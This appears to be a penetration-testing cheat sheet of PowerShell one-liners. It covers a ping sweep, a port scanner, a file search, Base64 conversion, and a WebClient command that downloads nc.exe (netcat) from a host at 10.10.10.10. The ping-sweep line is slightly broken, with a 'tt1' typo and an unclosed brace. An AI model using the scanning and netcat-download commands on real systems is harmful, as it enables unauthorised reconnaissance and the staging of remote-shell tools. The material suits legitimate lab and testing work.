# Powershell Scripts

Ping Sweeper
```powershell
1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String tt1
```

PowerShell Port Scanner
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IPADDR>", $_)) "Port $_ is open!"} 2>$null
```

Efficent Single Line Find Command
```powershell
ls -r C:\PATH -file | % {Select-String -path $_ -pattern YOURSTRING}
```

Single Liner Web Client 
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")
```

Convert a String from ASCII to Base64
```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PS FTW!"))
```

Convert a Base64 String to ASCII
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VEVTVE5HU09O"))
```
